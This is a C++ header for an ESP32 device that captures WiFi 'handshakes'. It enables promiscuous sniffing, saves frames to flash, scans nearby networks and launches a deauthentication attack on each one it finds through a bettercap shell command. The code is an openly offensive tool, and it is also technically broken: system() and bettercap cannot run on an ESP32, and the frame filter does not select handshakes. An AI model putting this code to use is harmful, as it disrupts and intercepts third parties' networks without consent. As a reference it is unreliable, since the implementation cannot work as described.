#ifndef WIFI_HANDSHAKE_H
#define WIFI_HANDSHAKE_H

#include <WiFi.h>
#include "FS.h"
#include "SPIFFS.h"
#include "esp_wifi.h" // Include ESP32 WiFi library for monitor mode
#include "DisplayManager.h" // Include DisplayManager to access updateDisplay()

// Function prototypes
void startHandshakeCapture();
void saveHandshakeData(uint8_t* buffer, size_t length);
void readHandshakeFile(); // Function to read and display handshake file content
void scanAndCapture();
void performDeauthAttack(const char* targetBSSID);
void channelHopper();
String bssidToString(const uint8_t* bssid); // Function to convert BSSID to string

// Function to enable monitor mode
void enableMonitorMode() {
    esp_wifi_set_mode(WIFI_MODE_NULL); // Set to NULL mode
    esp_wifi_start(); // Start the WiFi driver
    esp_wifi_set_promiscuous(true); // Enable promiscuous mode
}

// Packet sniffing callback function
void packetSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;

    // Check if it's a management frame (e.g., Probe Request, Beacon)
    if (pkt->payload[0] == 0x00 || pkt->payload[0] == 0x04) { // Adjust based on your needs
        saveHandshakeData(pkt->payload, pkt->rx_ctrl.sig_len);
        
        // Send captured packet over serial for retrieval via SerialShark or Serial Monitor
        Serial.write(pkt->payload, pkt->rx_ctrl.sig_len);
        
        // Alert on capture
        Serial.println("Handshake packet captured!");
        updateDisplay("Handshake Captured!"); // Display alert on E-Ink screen
        
        // Optional: Read and display PCAP file contents after saving a packet for verification.
        readHandshakeFile();
    }
}

// Function to scan for networks and attempt handshake captures
void scanAndCapture() {
    Serial.println("Scanning for networks...");
    int numNetworks = WiFi.scanNetworks();
    
    for (int i = 0; i < numNetworks; i++) {
        Serial.printf("Found network: %s, Signal strength: %d dBm\n", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
        
        String targetBSSID = bssidToString(WiFi.BSSID(i)); // Convert BSSID to string
        performDeauthAttack(targetBSSID.c_str()); // Perform deauth attack on found networks
        
        delay(1000); // Wait before scanning again or performing another attack
    }
}

// Function to save captured handshake data
void saveHandshakeData(uint8_t* buffer, size_t length) {
    File file = SPIFFS.open("/handshake.pcap", FILE_APPEND);
    
    if (!file) {
        Serial.println("Failed to open file for writing");
        updateDisplay("File Write Failed");
        return;
    }
    
    file.write(buffer, length); // Save the raw packet data
    file.close();
    
   Serial.println("Packet saved.");
}

// Function for deauthentication attack using Bettercap or similar tool
void performDeauthAttack(const char* targetBSSID) {
   String command = "bettercap -T " + String(targetBSSID) + " --deauth"; 
   system(command.c_str()); // Execute the command
}

// Function for channel hopping to increase handshake capture likelihood
void channelHopper() {
   for (int channel = 1; channel <= 13; channel++) { 
       esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
       delay(1000); // Wait for a second on each channel before scanning again
       scanAndCapture(); 
   }
}

// Function to convert BSSID from uint8_t array to string format
String bssidToString(const uint8_t* bssid) {
    char bssidStr[18]; // Format: XX:XX:XX:XX:XX:XX
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X", 
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(bssidStr);
}

// Function to read and display contents of the PCAP file for verification purposes.
void readHandshakeFile() {
   File file = SPIFFS.open("/handshake.pcap", FILE_READ);
   if (!file) {
       Serial.println("Failed to open handshake file for reading");
       return;
   }

   while (file.available()) {
       Serial.write(file.read()); // Print raw data to Serial Monitor for verification.
   }
    
   file.close();
}

#endif // WIFI_HANDSHAKE_H
